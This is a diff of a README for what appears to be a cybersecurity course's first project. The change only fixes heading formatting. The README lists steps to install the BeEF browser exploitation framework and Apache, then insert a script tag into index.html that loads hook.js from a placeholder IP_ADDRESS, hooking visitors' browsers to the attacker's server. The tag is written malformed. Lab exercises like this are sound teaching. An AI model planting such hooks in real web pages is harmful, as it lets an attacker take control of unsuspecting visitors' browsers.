@@ -1,19 +1,19 @@
 # KGM-Cyber-Project1
 Cybersecurity course first project in KGM
 
-###Install beef-xss using apt
+### Install beef-xss using apt
 * sudo apt update
 * sudo apt install beef-xss
 
-###Install apache2
+### Install apache2
 * sudo apt install apache2
 
-###Add script to index.html
+### Add script to index.html
 * cd /var/www/html
 * vim index.html
 * within the body tag, insert <script>src="http://IP_ADDRESS/hook.js"</script>
 
-###Start beEF and run apache
+### Start beEF and run apache
 * beef-xss
     * this will ask to set beEF password
 
